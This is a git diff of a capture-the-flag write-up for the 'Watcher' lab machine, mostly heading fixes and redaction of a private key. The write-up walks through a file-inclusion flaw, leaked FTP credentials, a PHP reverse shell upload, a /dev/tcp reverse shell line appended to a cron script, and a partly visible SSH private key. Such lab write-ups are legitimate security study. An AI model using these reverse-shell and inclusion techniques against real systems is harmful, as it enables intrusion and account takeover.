@@ -1,6 +1,6 @@
-##Watcher
+## Watcher
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Thu Feb 18 21:55:31 2021 as: nmap -sC -sV -o nmap/initial -vvv -p 22,21,80 10.10.204.136
 Nmap scan report for 10.10.204.136
@@ -30,7 +30,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Feb 18 21:55:45 2021 -- 1 IP address (1 host up) scanned in 13.76 seconds
 ```
 
-#Web Server
+# Web Server
 ```
 gobuster dir -u http://10.10.204.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster/initial
 ===============================================================
@@ -68,7 +68,7 @@ http://10.10.204.136/post.php?post=secret_file_do_not_read.txt
  Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
 ```
 
-#FTP
+# FTP
 ```
 ftp 10.10.204.136
 Connected to 10.10.204.136.
@@ -89,7 +89,7 @@ drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
 If we go in to the files directory we find that we are able to upload so lets upload a php reverse shell then abuse the ?post= argument again to access it via
 http://10.10.204.136/post.php?post=/home/ftpuser/ftp/files/revshell.php
 
-#Initial foothold
+# Initial foothold
 Our reverse shell successfully comes back and we stabalize our shell
 As we are the www-user lets check /var/www/html
 ```
@@ -112,7 +112,7 @@ drwxr-xr-x 2 root root 4096 Dec  3 01:42 more_secrets_a9f10a
 ```
 inside more_secret_a9f10a we find our 3rd flag
 
-#Privilege Escalation
+# Privilege Escalation
 ```
 sudo -l
 Matching Defaults entries for www-data on watcher:
@@ -122,6 +122,7 @@ Matching Defaults entries for www-data on watcher:
 User www-data may run the following commands on watcher:
     (toby) NOPASSWD: ALL
 ```
+
 We can run any command as toby so lets get a shell as toby
 ```
 sudo -u toby /bin/bash
@@ -183,12 +184,6 @@ echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> /home/toby/jobs/cow.sh
 
 After a little bit we get a reverse shell back as mat
 ```
-rlwrap nc -nlvp 4243
-listening on [any] 4243 ...
-connect to [10.13.1.12] from (UNKNOWN) [10.10.204.136] 55600
-bash: cannot set terminal process group (13514): Inappropriate ioctl for device
-bash: no job control in this shell
-ls -la
 ls -la
 total 312
 drwxr-xr-x 6 mat  mat    4096 Dec  3 03:31 .
@@ -333,12 +328,10 @@ LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
 OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
 WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
 REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
-U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
-NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
-TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
-WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
-bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
-NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
 bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
 STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
 LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
@@ -347,19 +340,19 @@ cat /opt/backups/key.b64 | base64 -d
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
 opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
-jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
-nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
-eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
-dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
-REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
-gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
-bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
-kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
-mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
 /6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
 4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
 -----END RSA PRIVATE KEY-----
 ```
+
 Looks like we found a backup of private ssh key, let assume this is root and try to ssh with it
 Success!!
 ```
